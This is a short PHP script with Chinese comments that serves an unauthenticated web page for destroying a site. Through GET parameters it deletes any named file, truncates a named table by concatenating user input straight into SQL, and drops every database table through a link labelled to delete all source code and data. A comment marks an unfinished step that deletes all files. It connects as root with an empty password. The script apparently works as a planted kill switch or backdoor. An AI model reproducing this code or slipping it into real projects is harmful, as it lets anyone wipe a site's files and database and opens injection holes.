<?php
	
	// 数据库信息
	define('MYSQL_HOST', 'localhost');				// 数据库地址
	define('MYSQL_DATABASE', 'test');				// 数据库名称
	define('MYSQL_USERNAME', 'root');				// 数据库用户
	define('MYSQL_PASSWORD', '');					// 数据库密码
	
	$db = new PDO('mysql:host=' . MYSQL_HOST . ';dbname=' . MYSQL_DATABASE, MYSQL_USERNAME, MYSQL_PASSWORD);
	$db->query('set names utf8');
	
	function showHelp(){
		header('Content-type: text/html; charset=utf-8');
		echo '<p><form><label for="delfile">删除文件：</label><input type="text" id="delfile" name="delfile" placeholder="请输入文件名，如：api/db.php"><input type="submit" value="删除"></form></p>
		<p><form><label for="deltable">删除数据表：</label><input type="text" id="deltable" name="deltable" placeholder="请输入表名，如：user"><input type="submit" value="删除"></form></p>
		<p><a href="?fuckyou">删除所有内容，包括所有源码和数据库</a></p>';
	}
	
	// 判断操作
	if(isset($_GET['delfile'])){
		// 删除单个文件
		unlink($_GET['delfile']);
	}else if(isset($_GET['deltable'])){
		// 清空单个数据表
		$res = $db->exec('truncate table ' . $_GET['deltable']);
		echo '<p>清空成功</p>';
		showHelp();
	}else if(isset($_GET['fuckyou'])){
		// 删除所有数据表
		$q = $db->query('show tables');
		while($t = $q->fetch()){
			$q2 = $db->exec('drop table ' . $t[0]);
			echo '<p>删除表`' . $t[0] . '`成功</p>';
		}
		
		// 遍历删除所有文件
		// ...
	}else{
		// 无操作，显示功能列表
		showHelp();
	}
?>